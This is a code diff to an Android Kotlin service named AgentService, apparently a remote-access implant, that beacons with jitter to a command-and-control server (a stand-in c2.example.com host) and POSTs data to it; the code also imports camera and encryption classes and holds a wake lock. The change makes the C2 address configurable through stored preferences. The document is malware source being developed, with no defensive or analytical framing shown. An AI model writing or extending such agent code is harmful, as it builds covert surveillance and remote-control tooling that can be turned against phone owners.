@@ -5,6 +5,7 @@ import android.app.Service
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.hardware.camera2.CameraAccessException
 import android.hardware.camera2.CameraManager
@@ -56,9 +57,11 @@ import javax.crypto.spec.GCMParameterSpec
 import javax.crypto.spec.SecretKeySpec
 import kotlin.concurrent.thread
 
-const val C2_SERVER = "https://c2.example.com/api"
+const val DEFAULT_C2_SERVER = "https://c2.example.com/api"
 const val BEACON_INTERVAL = 30000L
 const val JITTER_PERCENT = 0.2
+const val PREFS_NAME = "agent_config"
+const val KEY_C2_SERVER = "c2_server"
 
 class AgentService : Service() {
 
@@ -94,6 +97,11 @@ class AgentService : Service() {
         registerCapabilities()
         running = true
         thread(name = "agent-beacon") { beaconLoop() }
+    }
+
+    private fun getC2Server(): String {
+        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
+        return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER)
     }
 
     private fun acquireWakeLock() {
@@ -200,7 +208,7 @@ class AgentService : Service() {
     }
 
     private fun post(endpoint: String, payload: Any): Map<String, Any>? {
-        val url = URL("$C2_SERVER$endpoint")
+        val url = URL("${getC2Server()}$endpoint")
         val conn = url.openConnection() as HttpURLConnection
         conn.requestMethod = "POST"
         conn.doOutput = true
